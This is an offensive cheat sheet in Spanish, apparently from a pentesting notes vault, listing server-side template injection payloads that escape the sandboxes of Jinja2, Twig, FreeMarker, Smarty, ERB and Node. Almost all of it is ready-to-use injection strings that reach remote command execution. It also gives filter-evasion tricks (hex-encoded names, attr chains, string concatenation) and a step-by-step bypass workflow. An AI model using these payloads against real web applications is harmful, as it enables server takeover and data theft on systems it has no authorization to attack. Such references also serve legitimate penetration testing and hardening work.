---
aliases:
  - SSTI Sandbox Bypass
  - Jinja2 Sandbox Escape
  - Twig Sandbox Bypass
tags:
  - type/technique
  - vuln/ssti
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Server-Side Template Injection (SSTI)]]"
---
# SSTI - Sandbox Escape

***

## Jinja2 Sandbox Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{lipsum.__globals__.os.popen('id').read()}}` | RCE via helper Flask `lipsum` | SandboxedEnvironment con lipsum no filtrado. |
| `{{cycler.__init__.__globals__.os.popen('id').read()}}` | RCE via cycler helper | Helper Jinja2. |
| `{{joiner.__init__.__globals__.os.popen('id').read()}}` | RCE via joiner helper | Helper Jinja2. |
| `{{namespace.__init__.__globals__.os.popen('id').read()}}` | RCE via namespace helper | Helper Jinja2. |
| `{{request['__class__']['__init__']['__globals__']['os'].popen('id').read()}}` | RCE via bracket notation (bypass dot filter) | Sandbox filtra solo `.`. |
| `{{(()\|attr('__class__')\|attr('__bases__')\|attr('__getitem__')(0)\|attr('__subclasses__')())}}` | Subclass enumeration via attr filter | Filter chain bypass. |
| `{{ ()\|attr("\x5f\x5fclass\x5f\x5f")\|attr("\x5f\x5fmro\x5f\x5f") }}` | Hex-encoded `__class__` | Sandbox bloquea `__` literal. |
| `{{ "%c%c%c%c%c%c%c%c%c%c%c"\|format(95,95,99,108,97,115,115,95,95)\|attr() }}` | Construir `__class__` por ASCII codes | Filter strict en chars. |
| `{{ ['__cl','ass__']\|join }}` | String concat bypass via join | String filter en `__`. |
| `{{ ''[request.args.cls][...] }}` con `?cls=__class__` | URL params como input | Force `_*` filter via params. |
^ssti-sandbox-jinja2

### Workflow bypass Jinja2

```
1. Confirmar sandbox: {{config}} → si retorna `<class 'flask.Config'>` o `Forbidden`, sandbox activo.
2. Probar atributos no bloqueados: lipsum, cycler, joiner, request.
3. Si todos bloqueados: usar attr() filter con strings dinámicas.
4. Encadenar hasta __globals__ → os → popen → read.
```

___

## Twig Sandbox Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{['id']\|filter('system')}}` | RCE via filter callback | Twig sandbox con filter() permitido. |
| `{{['id']\|map('passthru')\|join('')}}` | RCE via map filter callback | Map permitido. |
| `{{[1,2]\|sort('exec')}}` | RCE via sort callback | Sort permitido. |
| `{{[1,2]\|reduce('system','id')}}` | RCE via reduce callback | Reduce permitido. |
| `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` | RCE clásico Twig 1.x via env | Twig 1.x antes de Symfony patch. |
| `{{_self.env.getTemplateSource('file.twig')}}` | Template source disclosure | Twig env access. |
| `{{_self.env.loadTemplate('file.twig')}}` | Load + render template arbitrario | Twig env access. |
| `{{_self.env.compileSource('{{system(\"id\")}}','test')}}` | Compile + ejecutar template inyectado | Twig env access. |
^ssti-sandbox-twig

___

## FreeMarker Security Manager Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<#assign x="freemarker.template.utility.ObjectConstructor"?new()>${x("java.util.Hashtable")}` | Bypass SAFER_RESOLVER via ObjectConstructor | ObjectConstructor permitido. |
| `<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>...</@value>` | RCE via Jython runtime | Jython en classpath. |
| `${"".class.forName("java.lang.Runtime").getMethod("exec",...)}` | RCE via reflection chain | ClassResolver permite class lookup. |
| `${className?api.protectionDomain.codeSource.location}` | Path disclosure via static fields | Static field access. |
| `<#assign cls="freemarker.template.utility."+"Execute"?new()>` | Bypass `?new()` filter via string concat | Filter naive sobre literal. |
^ssti-sandbox-freemarker

___

## Filter Abuse para Escape

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{value\|filter('callback')}}` | Twig — invocar callback custom | Filter() en sandbox acepta callable. |
| `{{value\|attr('method_name')}}` | Jinja2 acceso indirecto | attr filter bypass. |
| `${"<malicious>"?eval}` | FreeMarker — eval string como template | `?eval` builtin. |
| `<@"<malicious>"?interpret/>` | FreeMarker — interpret string | `?interpret` builtin. |
| `{$x\|cat:"\`id\`"}` | Smarty concat con backticks PHP | `\|cat` filter en Smarty. |
| `<%= UserInput %>` reflejado | ERB — RCE inmediato si input no escapado | Direct `<%= %>` con user input. |
| `Function('return process')()` | Node.js context — bypass via Function constructor | JS engines basados en Node. |
^ssti-sandbox-filter-abuse

***
